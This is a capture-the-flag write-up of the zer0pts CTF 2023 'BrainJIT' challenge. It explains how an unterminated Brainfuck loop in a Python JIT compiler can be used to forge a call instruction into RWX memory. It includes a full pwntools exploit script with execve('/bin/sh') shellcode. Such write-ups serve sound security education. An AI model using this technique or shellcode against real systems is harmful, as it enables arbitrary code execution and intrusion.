## BrainJIT

was a pwn challenge from zer0pts CTF 2023,

it was a challenge written by **ptr-yudai**, who wrote a serie of great challenges for this ctf.

It is a X86_64 JIT Brainfuck Compiler written in python, a nice piece of code by itself..

#### 1- How does this work?

first the JIT compiler allocates two memory zones , one for the code , and one for the data.

```python
class BrainJIT(object):
    MAX_SIZE = mmap.PAGESIZE * 8

    def __init__(self, insns: str):
        self._insns = insns
        self._mem = self._alloc(self.MAX_SIZE)
        self._code = self._alloc(self.MAX_SIZE)

    def _alloc(self, size: int):
        return mmap.mmap(
            -1, size, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC
        )
```

we can see two important things here:

* the `__init__` function allocate the two zones with the same protection mode RWX (that is important for the rest of exploitation).  The `MAX_SIZE` value equals 0x8000 (8 * page size)

* by debugging the program in the provided Docker, we can see that the two memory zones are consecutive in memory, the data zone starts where the code zone ends.

The compiler will add a piece of code before entering the produced code, and at his end, to initialise the registers.

```python
   def compile(self):
        addr_mem = ctypes.addressof(ctypes.c_int.from_buffer(self._mem))
        p8  = lambda v: struct.pack('<B', v)
        p32 = lambda v: struct.pack('<i', v)
        p64 = lambda v: struct.pack('<Q', v)
        # push r8
        # push rbp
        # xor r8d, r8d
        # mov rbp, addr_mem
        emit_enter = b'\x41\x50\x55\x45\x31\xc0\x48\xbd' + p64(addr_mem)
        # pop rbp
        # pop r8
        # ret
        emit_leave = b'\x5d\x41\x58\xc3'
```

we can see that the `rbp` register will be used to access the data memory, and the `r8` will be used as the brainfuck main register (and as an offset between 0 to 0x8000 to access data memory)

let's have a look to the main loop of `compile` function of the JIT Compiler, this is here that the code will be produced for each brainfuck instruction, it's a bit long, but not too much. (There were some errors in the comments that I have corrected):

```python
       self._emit(emit_enter)
        index = 0
        jumps = []
        while index < len(self._insns):
            insn = self._insns[index]
            length = 1
            if insn in ['<', '>', '+', '-']:
                while index + length < len(self._insns) \
                      and self._insns[index + length] == insn:
                    length += 1

            emit = b''
            if insn == '<':
                if length == 1:
                    # dec r8
                    emit += b'\x49\xff\xc8'
                else:
                    # sub r8, length
                    emit += b'\x49\x81\xe8' + p32(length)
                # cmp r8, self.MAX_SIZE
                # jb rip+1
                # int3
                emit += b'\x49\x81\xf8' + p32(self.MAX_SIZE) + b'\x72\x01\xcc'

            elif insn == '>':
                if length == 1:
                    # inc r8
                    emit += b'\x49\xff\xc0'
                else:
                    # add r8, length
                    emit += b'\x49\x81\xc0' + p32(length)
                # cmp r8, self.MAX_SIZE
                # jb rip+1
                # int3
                emit += b'\x49\x81\xf8' + p32(self.MAX_SIZE) + b'\x72\x01\xcc'

            elif insn == '+':
                if length == 1:
                    # inc byte ptr [rbp+r8]
                    emit += b'\x42\xfe\x44\x05\x00'
                else:
                    # add byte ptr [rbp+r8], length
                    emit += b'\x42\x80\x44\x05\x00' + p8(length % 0x100)

            elif insn == '-':
                if length == 1:
                    # dec byte ptr [rbp+r8]
                    emit += b'\x42\xfe\x4c\x05\x00'
                else:
                    # sub byte ptr [rbp+r8], length
                    emit += b'\x42\x80\x6c\x05\x00' + p8(length % 0x100)

            elif insn == ',':
                # mov edx, 1
                # lea rsi, [rbp+r8]
                # xor edi, edi
                # xor eax, eax ; SYS_read
                # syscall
                emit += b'\xba\x01\x00\x00\x00\x4a\x8d\x74\x05\x00'
                emit += b'\x31\xff\x31\xc0\x0f\x05'

            elif insn == '.':
                # mov edx, 1
                # lea rsi, [rbp+r8]
                # mov edi, edx
                # mov eax, edx ; SYS_write
                # syscall
                emit += b'\xba\x01\x00\x00\x00\x4a\x8d\x74\x05\x00'
                emit += b'\x89\xd7\x89\xd0\x0f\x05'

            elif insn == '[':
                # mov al, byte ptr [rbp+r8]
                # test al, al
                # jz ??? (address will be fixed later)
                emit += b'\x42\x8a\x44\x05\x00\x84\xc0'
                emit += b'\x0f\x84' + p32(-1)
                jumps.append(self._code_len + len(emit))

            elif insn == ']':
                if len(jumps) == 0:
                    raise SyntaxError(f"Unmatching loop ']' at position {index}")
                # mov al, byte ptr [rbp+r8]
                # test al, al
                # jnz dest
                dest = jumps.pop()
                emit += b'\x42\x8a\x44\x05\x00\x84\xc0'
                emit += b'\x0f\x85' + p32(dest - self._code_len - len(emit) - 6)
                self._code[dest-4:dest] = p32(self._code_len + len(emit) - dest)

            else:
                raise SyntaxError(f"Unexpected instruction '{insn}' at position {index}")

            self._emit(emit)
            index += length

        self._emit(emit_leave)
```

The JIT compiler does some optimisations in the produced code, for example if you increase many times main register with **'>'** brainfuck instruction, it will record the number of repetition in the `length` variable, and will replace the increments, by an `add r8, length`

the same type of optimisation is used for brainfuck instruction **'>', '<', '+', '-'**

#### 2- The vulnerabilty

Now let's have a look to the vulnerability I used for the exploitation, it's in the management of brainfuck loop instruction.

the **'['** brainfuck instruction indicates the starting of a loop, and the **']'** instruction indicates the end of the loop.

The JIT compiler use a  `jumps` python array ,  working like a `lifo` type of stack.

when a **'['** instruction is met, the code does:

```python
elif insn == '[':
                # mov al, byte ptr [rbp+r8]
                # test al, al
                # jz ??? (address will be fixed later)
                emit += b'\x42\x8a\x44\x05\x00\x84\xc0'
                emit += b'\x0f\x84' + p32(-1)
                jumps.append(self._code_len + len(emit))
```

it initialises the jump to the end of the loop, with `-1` value, that will be fixed later with the **']'** brainfuck loop closing instruction is met. The address of the code to be fixed is appended to the `jumps` array

so when the  **']'** brainfuck loop closing instruction is met, the code does:

```python
elif insn == ']':
                if len(jumps) == 0:
                    raise SyntaxError(f"Unmatching loop ']' at position {index}")
                # mov al, byte ptr [rbp+r8]
                # test al, al
                # jnz dest
                dest = jumps.pop()
                emit += b'\x42\x8a\x44\x05\x00\x84\xc0'
                emit += b'\x0f\x85' + p32(dest - self._code_len - len(emit) - 6)
                self._code[dest-4:dest] = p32(self._code_len + len(emit) - dest)    # jump fixing
```

the address of the beginning of the loop is "pop" from `jumps` array,

and the code fix the beginning of loop code temporary `-1` value, with the correct address of the end of loop.

**But, what happens if we open a loop with '[' and never close it ?**

well...actually the beginning of loop's jump temporary value `-1` is never fixed and stay like this, this will be a jump to 1 byte before the next instruction, so to a `0xff` opcode, which is not a full instruction in `x86_64` instruction encoding.

So if we could add some bytes that would make the `0xff` opcode a full instruction, we could maybe alter the program control flow?

after looking at the various bytes emitted by brainfuck instructions, I found that by using multiple **'<'** brainfuck instructions,

the JIT compiler will emit:

```python
# sub r8, length
emit += b'\x49\x81\xe8' + p32(length)
```

and if we check by disassembling the resulting opcodes:

```shell
pwn disasm -c 'amd64' ff4981e80000000000
   0:    ff 49 81                 dec    DWORD PTR [rcx-0x7f]
   3:    e8 xx xx xx xx           call   (offset length)
```

that's perfect for us, that means that the `length` variable will be the offset of the `call` instruction, and that we can jump to somewhere further in our memory zone, to reach a shellcode for example, that we could put in the data zone (which is RWX as we said before).

The only requirement is that `rcx` points to a writable zone in memory, to pass the `dec    DWORD PTR [rcx-0x7f]` instruction.

Syscalls will put the return address in `rcx` register on x86_64 architecture, so it will points to our code that is a writable zone off course.

#### 3- So What is the plan ?

1. we advance our code in memory, to make it near the data zone, like this the forged `call` offset would not need to be too big..we will use **'.'** print brainfuck instruction for that, like that it will initialise the `rcx` register at the same time.
2. we write a simple `execve("/bin/sh",0,0)` shellcode at the beginning of the data zone , the call will jump to it.
3. we begin a loop with **'['** brainfuck instruction, and just after we send multiple **'<'** brainfuck instructions that will encode the offset of the forged call instruction

So, when executed the JIT compiled produced code, will execute our shellcode, and we will have a shell.

I hope you understand my explanation , if it's not the case, you can still read the exploit code:

```python
from pwn import *

if args.REMOTE:
  p = remote('pwn.2023.zer0pts.com', 9004)
else:
  p = remote('127.0.0.1', 9999)

# execve('/bin/sh',0,0) shellcode
shellc = b'\x31\xf6\xf7\xe6\x56\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'

# write shellcode in data mem
payload = b'.'*0x700
for c in shellc:
  for i in range(c):
    payload += b'+'
  payload += b'>'

# unterminated loop, will alter 0xff in
'''pwn disasm -c 'amd64' ff4981e80000000000
   0:    ff 49 81                 dec    DWORD PTR [rcx-0x7f]
   3:    e8 00 00 00 00           call   0x8'''
# we set jump to shellcode
payload += b'.['+b'<'*0xe2a

p.sendlineafter(': ', payload)
p.interactive()
```

*nobodyisnobody stills pwning things...*
